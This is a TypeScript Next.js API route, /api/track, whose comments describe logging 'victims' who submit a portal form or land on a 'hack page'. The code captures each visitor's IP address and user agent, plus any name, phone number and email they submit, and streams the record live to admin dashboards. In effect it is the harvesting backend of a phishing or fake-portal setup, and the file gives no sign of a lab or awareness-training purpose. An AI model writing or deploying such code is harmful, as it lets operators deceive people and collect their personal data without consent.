import { NextRequest, NextResponse } from "next/server";
import { addVictim, notifyClients } from "@/lib/sessions";

/**
 * POST /api/track
 * Called when a victim submits portal form or lands on hack page
 * Now accepts optional form data from portal
 */
export async function POST(request: NextRequest) {
    try {
        const userAgent = request.headers.get("user-agent") || "Unknown";
        const forwarded = request.headers.get("x-forwarded-for");
        const ip = forwarded?.split(",")[0] || request.headers.get("x-real-ip") || "Unknown";

        // Try to parse form data from request body
        let formData: { name?: string; phone?: string; email?: string } | undefined;
        try {
            const body = await request.json();
            if (body.name || body.phone || body.email) {
                formData = {
                    name: body.name || undefined,
                    phone: body.phone || undefined,
                    email: body.email || undefined,
                };
            }
        } catch {
            // No body or invalid JSON - that's fine, form data is optional
        }

        const victim = addVictim(userAgent, ip, formData);

        // Notify all connected admin dashboards
        notifyClients(victim);

        return NextResponse.json({
            success: true,
            victimId: victim.id
        });
    } catch (error) {
        console.error("Track error:", error);
        return NextResponse.json(
            { success: false, error: "Failed to track" },
            { status: 500 }
        );
    }
}

/**
 * GET /api/track
 * Health check for the tracking endpoint
 */
export async function GET() {
    return NextResponse.json({
        status: "ok",
        message: "Tracking endpoint active"
    });
}
